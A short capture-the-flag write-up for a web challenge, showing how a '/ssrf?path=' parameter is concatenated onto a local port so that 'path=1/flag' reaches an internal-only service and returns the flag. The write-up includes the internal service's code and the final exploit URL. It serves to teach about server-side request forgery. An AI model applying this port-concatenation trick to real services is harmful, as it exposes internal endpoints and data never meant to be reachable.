@@ -1,0 +1,41 @@
+So i will be honest, i got lucky on this without even downloading the source code.
+
+visiting : https://wsc-2022-web-1-bvel4oasra-uc.a.run.app/ -> reads public.js and spit the code as response.
+obv we will be using /ssrf?path=/ to eventually access flag.txt.
+
+PS : visiting https://wsc-2022-web-1-bvel4oasra-uc.a.run.app/ssrf?path=/ was like visiting localhost:1001 since public.js was using 1001 as app.listen.
+
+The funny thing here was basically me being lucky and went to /ssrf?path=1 , just to try numbers LOL.
+then i understood all of it:
+
+visiting https://wsc-2022-web-1-bvel4oasra-uc.a.run.app/ssrf?path=1 was basically like visiting : localhost:10011 , since the default user port there was 1001, path=1 , the 1 got concatenated with 1001 , resulting in a response spitting :
+
+```
+const express = require('express')
+const app = express()
+const private2Port = 10011
+
+app.get('/', (req, res) => {
+    res.sendFile(__dirname + '/private2.js')
+})
+
+app.get('/flag', (req, res) => {
+    res.sendFile(__dirname + '/flag.txt')
+})
+
+// this port is only exposed locally
+app.listen(private2Port, () => {
+    console.log(`Listening on ${private2Port}`)
+})
+```
+
+from here u can understand it all, and also /flag is being declared as GET route there, and that's how i got to it:
+
+- https://wsc-2022-web-1-bvel4oasra-uc.a.run.app/ssrf?path=1/flag
+
+which drops the flag, that was one funny moment tho :p.
+
+
+
+
+by x544D.
